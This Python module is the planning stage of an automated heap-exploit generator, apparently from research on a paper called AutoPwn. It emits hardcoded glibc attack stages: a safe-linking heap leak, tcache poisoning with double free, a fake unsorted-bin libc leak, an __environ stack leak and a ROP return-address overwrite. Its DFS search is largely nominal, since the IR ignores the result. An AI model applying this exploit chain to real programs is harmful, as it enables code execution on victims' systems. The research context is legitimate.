"""
Module 6: Evolutionary Planner (Rewritten — matches Paper Algorithm 2)

Implements the exploit generation algorithm from the AutoPwn paper:
- DFSExplore(s0, A): recursive DFS through ESM states
- ActionQuery (AQ): find applicable actions from current state
- StateEquivalenceQuery (EQ): check if two states are equivalent
- ApplyAction: apply an action and get the resulting state
- Priority: most popular action first (by frequency in training exploits)
- Backtracking when action fails

Input: esm_output.json + critical_vars.json + target binary
Output: final_plan.json with action sequence
"""

import json
import os
import sys
import argparse
import re
from typing import List, Dict, Optional, Any, Set, Tuple
from pwn import ELF, context

# Add parent directory to path for knowledge base import
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from knowledge_base.loader import get_knowledge_base

context.log_level = 'error'


class EvolutionaryPlanner:
    """Implements Algorithm 2 from the AutoPwn paper."""

    def __init__(self, esm_data: dict, critical_vars: dict,
                 binary_path: str = None, symbolic_results: dict = None):
        # Handle both old format (list of states) and new format (dict with esm_states)
        if isinstance(esm_data, dict):
            self.esm_states = esm_data.get("esm_states", [])
            self.chunk_table = esm_data.get("chunk_table", {})
            self.leak_info = esm_data.get("leak_info", [])
            self.action_catalog = esm_data.get("action_catalog", [])
            self.state_transitions = esm_data.get("state_transitions", [])
        else:
            self.esm_states = esm_data if isinstance(esm_data, list) else []
            self.chunk_table = {}
            self.leak_info = []
            self.action_catalog = []
            self.state_transitions = []

        self.esm_latest = self.esm_states[-1]["state_after"] if self.esm_states else {}
        self.critical_vars = critical_vars
        self.symbolic_results = symbolic_results or {}
        self.observed_sizes = self._extract_sizes()
        self.heap_layout = self._extract_heap_layout()

        # Load knowledge base
        self.kb = get_knowledge_base()

        # Load libc
        self.libc = None
        self.libc_path = None
        if binary_path:
            self._load_libc(binary_path)

        # ESM state tracking
        self.current_state: Optional[dict] = None
        self.visited_states: Set[str] = set()

    def _load_libc(self, binary_path: str):
        """Load libc from the binary's linked library."""
        try:
            exe = ELF(binary_path, checksec=False)
            if exe.libc:
                self.libc = exe.libc
                self.libc_path = exe.libc.path
        except Exception:
            binary_dir = os.path.dirname(os.path.abspath(binary_path))
            for candidate in ["libc.so.6", "libc.so"]:
                libc_path = os.path.join(binary_dir, candidate)
                if os.path.exists(libc_path):
                    self.libc = ELF(libc_path, checksec=False)
                    self.libc_path = libc_path
                    break

    def _extract_sizes(self) -> List[int]:
        sizes = set()
        for entry in self.esm_states:
            ev = entry.get("event", {})
            if ev.get("type") == "Alloc":
                sz = ev.get("size", 0)
                if sz:
                    sizes.add(sz)
        return sorted(list(sizes)) if sizes else [0x30]

    def _extract_heap_layout(self) -> Dict[str, Any]:
        """Build complete heap layout from chunk_table and trace events."""
        layout = {
            "first_chunk_offset": 0x2a0,
            "chunks": {},
            "max_alloc_addr": 0,
            "heap_base": None,
        }

        for addr_hex, info in self.chunk_table.items():
            addr = int(addr_hex, 16)
            offset = addr & 0xfff
            size = info["size"]
            tag = None
            for entry in self.esm_states:
                ev = entry.get("event", {})
                if ev.get("type") == "Alloc" and ev.get("addr") == addr_hex:
                    tag = f"chunk_{len(layout['chunks'])}"
                    break
            layout["chunks"][addr_hex] = {
                "addr": addr,
                "offset": offset,
                "size": size,
                "status": info["status"],
                "tag": tag or f"chunk_{len(layout['chunks'])}",
            }
            if addr > layout["max_alloc_addr"]:
                layout["max_alloc_addr"] = addr
            if layout["heap_base"] is None:
                layout["heap_base"] = addr - offset

        if not layout["chunks"]:
            return layout

        addrs = sorted(layout["chunks"].values(), key=lambda c: c["addr"])
        layout["first_chunk"] = addrs[0]
        layout["first_chunk_offset"] = addrs[0]["offset"]
        chunk0 = addrs[0]
        layout["heap_base"] = chunk0["addr"] - chunk0["offset"]

        return layout

    # ─── State Equivalence Query (EQ) ────────────────────────────────
    @staticmethod
    def state_eq(s1: dict, s2: dict) -> bool:
        """
        Check if two ESM states are equivalent.
        Returns True if all corresponding values are identical.
        """
        for cat in ["bugs", "primitives", "techniques", "capabilities", "goals"]:
            d1 = s1.get(cat, {})
            d2 = s2.get(cat, {})
            detected1 = {k for k, v in d1.items() if v.get("state") == "detected"}
            detected2 = {k for k, v in d2.items() if v.get("state") == "detected"}
            if detected1 != detected2:
                return False
        return True

    # ─── Action Query (AQ) ───────────────────────────────────────────
    def action_query(self, state: dict) -> List[dict]:
        """
        Given a state si, return all possible actions that can be
        processed after si in the ESM.
        Sorted by frequency (most popular first).
        """
        actions = []
        detected_caps = {k for k, v in state.get("capabilities", {}).items()
                        if v.get("state") == "detected"}
        detected_prims = {k for k, v in state.get("primitives", {}).items()
                         if v.get("state") == "detected"}
        detected_techs = {k for k, v in state.get("techniques", {}).items()
                         if v.get("state") == "detected"}

        all_detected = detected_caps | detected_prims | detected_techs

        # Get transitions from exploit IR
        exploit_ir = self.critical_vars.get("composite_exploit_ir",
                                            self.critical_vars.get("exploit_ir", {}))
        transitions = exploit_ir.get("transitions", [])

        for t in transitions:
            from_key = t["from"]
            if from_key in all_detected:
                actions.append({
                    "action": t["action"],
                    "target_state": t["to"],
                    "confidence": t.get("confidence", 0.5),
                    "from": from_key,
                })

        # Sort by confidence (most popular first)
        # Boost confidence if technique was verified by angr
        verified_techs = self.symbolic_results.get("summary", {}).get("verified_techniques", [])
        for a in actions:
            for vt in verified_techs:
                if vt.lower() in a["action"].lower() or vt.lower() in a["target_state"].lower():
                    a["confidence"] += 0.5  # Significant priority boost
                    
        actions.sort(key=lambda a: a["confidence"], reverse=True)
        return actions

    # ─── Apply Action ────────────────────────────────────────────────
    def apply_action(self, current_state: dict, action: dict) -> dict:
        """
        Apply an action to the current state and return the resulting state.
        Uses symbolic results for concretization if available.
        """
        # Simulate state transition based on action
        new_state = dict(current_state)

        # Update capabilities based on action
        target = action.get("target_state", "")
        if target:
            if target in ("libc_leak", "stack_leak"):
                if "capabilities" not in new_state:
                    new_state["capabilities"] = {}
                new_state["capabilities"][target] = {"state": "detected"}
            elif target in ("arbitrary_allocation", "arbitrary_write"):
                if "primitives" not in new_state:
                    new_state["primitives"] = {}
                new_state["primitives"][target] = {"state": "detected"}
            elif target in ("control_flow_hijack",):
                if "goals" not in new_state:
                    new_state["goals"] = {}
                new_state["goals"][target] = {"state": "detected"}
            elif target in ("tcache_poisoning", "unsortedbin_leak", "chunk_overlap"):
                if "techniques" not in new_state:
                    new_state["techniques"] = {}
                new_state["techniques"][target] = {"state": "detected"}

        return new_state

    # ─── DFS Explore (Algorithm 2) ───────────────────────────────────
    def dfs_explore(self, si: dict, actions_list: List[dict]) -> Optional[List[dict]]:
        """
        Recursive DFS search through ESM states.
        Returns the final action list if successful, None otherwise.
        """
        # Check if we've reached the final state
        if self._is_final_state(si):
            return actions_list

        # Get candidate actions
        candidate_actions = self.action_query(si)
        if not candidate_actions:
            return None

        for action in candidate_actions:
            # Apply action
            sj = self.apply_action(si, action)

            # Check state equivalence
            expected_state = self._get_expected_state(si, action)
            if self.state_eq(sj, expected_state):
                # Action succeeded, recurse
                result = self.dfs_explore(sj, actions_list + [action])
                if result is not None:
                    return result

        return None

    def _is_final_state(self, state: dict) -> bool:
        """Check if the current state is the final exploitation state."""
        goals = state.get("goals", {})
        return any(v.get("state") == "detected" for v in goals.values())

    def _get_expected_state(self, si: dict, action: dict) -> dict:
        """Get the expected state after applying an action."""
        target = action.get("target_state", "")
        expected = dict(si)

        if target in ("libc_leak", "stack_leak"):
            if "capabilities" not in expected:
                expected["capabilities"] = {}
            expected["capabilities"][target] = {"state": "detected"}
        elif target in ("arbitrary_allocation", "arbitrary_write"):
            if "primitives" not in expected:
                expected["primitives"] = {}
            expected["primitives"][target] = {"state": "detected"}
        elif target in ("control_flow_hijack",):
            if "goals" not in expected:
                expected["goals"] = {}
            expected["goals"][target] = {"state": "detected"}
        elif target in ("tcache_poisoning", "unsortedbin_leak", "chunk_overlap"):
            if "techniques" not in expected:
                expected["techniques"] = {}
            expected["techniques"][target] = {"state": "detected"}

        return expected

    # ─── IR Generation from Action Sequence ──────────────────────────
    def _generate_ir_from_actions(self, actions: List[dict]) -> List[dict]:
        """Convert the action sequence into concrete exploit IR.

        Strategy from writeup:
        1. Leak heap via XOR safe linking
        2. Fake 0x421 chunk → unsorted bin → leak libc (main_arena)
        3. Fake chunk at __environ-0x18 → leak stack
        4. Fake chunk at stack-0x158 → ROP return address
        """
        main_size = 0x30
        if self.observed_sizes:
            main_size = self.observed_sizes[-1]
        if main_size > 0x400:
            main_size = min(main_size, 0x200)

        # Build IR stages based on detected capabilities
        ir_stages = []
        detected_caps = set()
        for entry in self.esm_states:
            state = entry.get("state_after", {})
            for cat in ["capabilities", "primitives", "techniques", "goals"]:
                for k, v in state.get(cat, {}).items():
                    if v.get("state") == "detected":
                        detected_caps.add(k)

        # ─── Stage 1: Leak Heap (XOR Safe Linking) ───────────────────
        stage1_ir = [
            {"op": "ALLOC", "tag": "chunk0", "size": main_size, "data": "b'A'*0x30"},
            {"op": "ALLOC", "tag": "chunk1", "size": main_size, "data": "b'B'*0x30"},
            {"op": "FREE", "tag": "chunk0"},
            {
                "op": "READ_VAL",
                "tag": "chunk0",
                "save_as": "xor_key",
                "offset": 0,
                "note": "read_first_8_bytes_fd_xor",
            },
            {"op": "CALC", "var": "heap_base", "expr": "xor_key << 12"},
        ]
        ir_stages.append({
            "name": "leak_heap_xor",
            "requires": ["uaf"],
            "produces": {"heap_base": {"trust": 0.95}},
            "trust": 0.95,
            "ir": stage1_ir,
        })

        # ─── Stage 2: Leak libc (Fake 0x421 Unsorted Bin) ────────────
        if "libc_leak" in detected_caps or "unsortedbin_leak" in detected_caps or "fake_unsorted_bin" in detected_caps:
            stage2_ir = [
                # Double free bypass on chunk0
                {"op": "EDIT", "tag": "chunk0", "data": "p64(0)*2"},
                {"op": "FREE", "tag": "chunk0"},
                # Poison FD → heap+0x2d0 (target to overwrite chunk0 size)
                {
                    "op": "POISON_FD",
                    "tag": "chunk0",
                    "pos": "heap_base + 0x0",
                    "target": "heap_base + 0x2d0",
                },
                # Allocate at poisoned address
                {"op": "ALLOC", "tag": "dummy1", "size": main_size},
                {"op": "ALLOC", "tag": "overwrite_size", "size": main_size, "data": "p64(0) + p64(0x421)"},

                # Double free again → poison FD → heap+0x6f0 (fake chunk location)
                {"op": "FREE", "tag": "chunk0"},
                {"op": "EDIT", "tag": "chunk0", "data": "p64(0)*2"},
                {"op": "FREE", "tag": "chunk0"},
                {
                    "op": "POISON_FD",
                    "tag": "chunk0",
                    "pos": "heap_base + 0x0",
                    "target": "heap_base + 0x6f0",
                },
                {"op": "ALLOC", "tag": "dummy2", "size": main_size},
                # Create fake chunks: prev_inuse=1, prev_size match
                {
                    "op": "ALLOC",
                    "tag": "fake_chunks",
                    "size": main_size,
                    "data": "p64(0) + p64(0x21) + p64(0)*3 + p64(0x21)",
                },

                # Free chunk1 → 0x421 chunk goes to unsorted bin
                {"op": "FREE", "tag": "chunk1"},
                {
                    "op": "READ_VAL",
                    "tag": "chunk1",
                    "save_as": "libc_leak",
                    "offset": 0,
                    "note": "read_first_8_bytes_fd_xor",
                },
            ]

            # Compute libc base
            libc_calc_expr = "libc_leak - LIBC_AUTO_OFFSET"
            if self.libc:
                sym_offset = None
                for name in ["main_arena", "__malloc_hook", "__free_hook"]:
                    if name in self.libc.symbols:
                        sym_offset = self.libc.symbols[name]
                        break
                if sym_offset is not None:
                    # main_arena+96 is the unsorted bin FD/BK offset
                    libc_calc_expr = f"libc_leak - {hex(sym_offset + 96)}"

            stage2_ir.append({
                "op": "CALC",
                "var": "libc.address",
                "expr": libc_calc_expr,
                "note": "AUTO",
            })

            ir_stages.append({
                "name": "leak_libc_fake_unsorted",
                "requires": ["heap_base", "uaf", "double_free"],
                "produces": {"libc_leak": {"trust": 0.9}},
                "trust": 0.9,
                "ir": stage2_ir,
            })

        # ─── Stage 3: Leak Stack (environ) ───────────────────────────
        if "stack_leak" in detected_caps or "environ_leak" in detected_caps:
            stage3_ir = [
                # Double free → poison FD → __environ - 0x18
                {"op": "FREE", "tag": "chunk0"},
                {"op": "EDIT", "tag": "chunk0", "data": "p64(0)*2"},
                {"op": "FREE", "tag": "chunk0"},
                {
                    "op": "POISON_FD",
                    "tag": "chunk0",
                    "pos": "heap_base + 0x0",
                    "target": "libc.symbols['__environ'] - 0x18",
                },
                {"op": "ALLOC", "tag": "dummy3", "size": main_size},
                {"op": "ALLOC", "tag": "environ_chunk", "size": main_size, "data": "b'A'*0x18"},
                {
                    "op": "READ_VAL",
                    "tag": "environ_chunk",
                    "save_as": "stack_leak",
                    "offset": 0,
                    "note": "skip_A_0x18_then_read_6_bytes",
                },
            ]
            ir_stages.append({
                "name": "leak_stack_environ",
                "requires": ["libc_leak", "uaf", "double_free"],
                "produces": {"stack_leak": {"trust": 0.9}},
                "trust": 0.9,
                "ir": stage3_ir,
            })

        # ─── Stage 4: ROP Return Address ─────────────────────────────
        if "control_flow_hijack" in detected_caps or "rop_chain" in detected_caps:
            stage4_ir = [
                # Double free → poison FD → stack - 0x158 (return address)
                {"op": "FREE", "tag": "chunk0"},
                {"op": "EDIT", "tag": "chunk0", "data": "p64(0)*2"},
                {"op": "FREE", "tag": "chunk0"},
                {
                    "op": "POISON_FD",
                    "tag": "chunk0",
                    "pos": "heap_base + 0x0",
                    "target": "stack_leak - 0x158",
                },
                {"op": "ALLOC", "tag": "dummy4", "size": main_size},
                {"op": "ALLOC_ROP", "tag": "rop_payload", "size": main_size},
            ]
            ir_stages.append({
                "name": "rop_return_address",
                "requires": ["stack_leak", "uaf", "double_free"],
                "produces": {"control_flow_hijack": {"method": "ROP"}},
                "trust": 0.95,
                "ir": stage4_ir,
            })

        return ir_stages

    # ─── Knowledge-Based Validation ──────────────────────────────────

    def validate_plan(self, plan: Dict) -> List[Dict]:
        """Validate exploit plan against knowledge base rules."""
        issues = []

        for stage in plan.get("path", []):
            for instr in stage.get("ir", []):
                op = instr.get("op", "")
                data = instr.get("data", "")

                # Validate fake chunk sizes
                if op == "ALLOC" and "0x421" in str(data):
                    # 0x421 includes PREV_INUSE bit, actual size is 0x420
                    actual_size = 0x420
                    is_valid, reason = self.kb.validate_fake_chunk_size(actual_size, "unsorted_bin")
                    if not is_valid:
                        issues.append({
                            "stage": stage["name"],
                            "instruction": instr,
                            "issue": reason,
                            "severity": "ERROR"
                        })
                    else:
                        issues.append({
                            "stage": stage["name"],
                            "instruction": instr,
                            "issue": f"Knowledge validation: {reason}",
                            "severity": "INFO"
                        })

        # Validate entire free sequence
        free_actions = []
        for stage in plan.get("path", []):
            for instr in stage.get("ir", []):
                if instr.get("op") in ("FREE", "ALLOC"):
                    free_actions.append(instr)

        is_valid, seq_issues = self.kb.validate_free_sequence(free_actions)
        issues.extend(seq_issues)

        return issues

    def _compute_forged_size(self) -> int:
        """Compute forged chunk size for unsorted bin attack."""
        tcache_bins = 64
        max_tcache_size = tcache_bins * 0x10
        forged = max_tcache_size + 0x20 + 1
        return forged

    def _compute_poison_target(self) -> int:
        """Compute POISON_FD target address."""
        if self.heap_layout.get("chunks"):
            chunks = sorted(
                self.heap_layout["chunks"].values(), key=lambda c: c["addr"]
            )
            first_chunk = chunks[0]
            main_size = self.observed_sizes[-1] if self.observed_sizes else 0x30
            target = first_chunk["addr"] + main_size
            return target
        return 0x2d0

    # ─── Main Entry Points ───────────────────────────────────────────
    def build_plan(self) -> Dict:
        """Generate exploit plan using DFS exploration."""
        # Start from initial state
        initial_state = self.esm_states[0]["state_after"] if self.esm_states else {}
        self.current_state = initial_state

        # Run DFS exploration
        action_sequence = self.dfs_explore(initial_state, [])

        if action_sequence:
            print(f"[+] DFS found exploit path with {len(action_sequence)} actions")
            ir_stages = self._generate_ir_from_actions(action_sequence)
        else:
            print("[-] DFS failed to find complete path, falling back to detected capabilities")
            ir_stages = self._generate_ir_from_actions([])

        plan = {"trust": 0.9, "path": ir_stages}

        # Validate plan against knowledge base
        issues = self.validate_plan(plan)
        if issues:
            error_count = sum(1 for i in issues if i.get("severity") == "ERROR")
            info_count = sum(1 for i in issues if i.get("severity") == "INFO")
            print(f"[!] Knowledge validation: {error_count} errors, {info_count} info")
            for issue in issues:
                severity = issue.get("severity", "UNKNOWN")
                print(f"    [{severity}] {issue.get('issue', '')}")
            plan["validation_issues"] = issues

        return plan

    def print_strategy(self, plan: Dict):
        print("\n" + "=" * 60)
        print(f"  [STRATEGY] Overall Trust: {plan['trust']}")
        print("=" * 60)
        for i, stage in enumerate(plan.get("path", []), 1):
            print(f" STAGE {i}: {stage['name']} (Trust: {stage['trust']})")
            print(f"   -> Produces: {', '.join(stage['produces'].keys())}")
            for instr in stage.get("ir", []):
                op = instr["op"]
                tag = instr.get("tag", "")
                details = []
                for k, v in instr.items():
                    if k not in ["op", "tag"]:
                        details.append(f"{k}={v}")
                detail_str = f" ({', '.join(details)})" if details else ""
                print(f"      - {op:<20} {tag:<15} {detail_str}")
            print("-" * 60)

    def save_plan(self, plan: Dict, output_file: str):
        with open(output_file, "w") as f:
            json.dump(plan, f, indent=4)
        print(f"[OK] Precise DSL plan saved to {output_file}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--binary", default=None, help="Path to the target binary")
    parser.add_argument("--symbolic", default="../artifacts/symbolic_results.json")
    args = parser.parse_args()

    esm_path = "../artifacts/esm_output.json"
    critical_path = "../artifacts/critical_vars.json"
    plan_output = "../artifacts/final_plan.json"

    with open(esm_path, "r") as f:
        esm_data = json.load(f)
    with open(critical_path, "r") as f:
        critical_vars = json.load(f)

    symbolic_results = {}
    if os.path.exists(args.symbolic):
        with open(args.symbolic, "r") as f:
            symbolic_results = json.load(f)

    planner = EvolutionaryPlanner(esm_data, critical_vars, args.binary, symbolic_results)
    plan = planner.build_plan()
    planner.print_strategy(plan)
    planner.save_plan(plan, plan_output)
